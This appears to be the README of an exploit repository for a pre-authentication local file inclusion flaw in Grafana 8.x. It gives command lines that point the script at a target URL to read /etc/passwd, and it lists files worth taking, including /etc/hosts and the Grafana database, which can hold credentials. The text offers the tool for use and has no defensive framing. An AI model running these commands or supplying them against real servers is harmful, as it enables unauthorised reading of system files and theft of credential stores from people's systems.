# Grafana-LFI-8.x
Exploit grafana Pre-Auth LFI

## How to use

```
python3 grafana-exploit.py http://site.com /etc/passwd
```
Or
```
python3 grafana-exploit.py http://site:8080 /etc/passwd
```

Interesting files

```
/etc/passwd

/etc/hosts

/var/lib/grafana/grafana.db
```
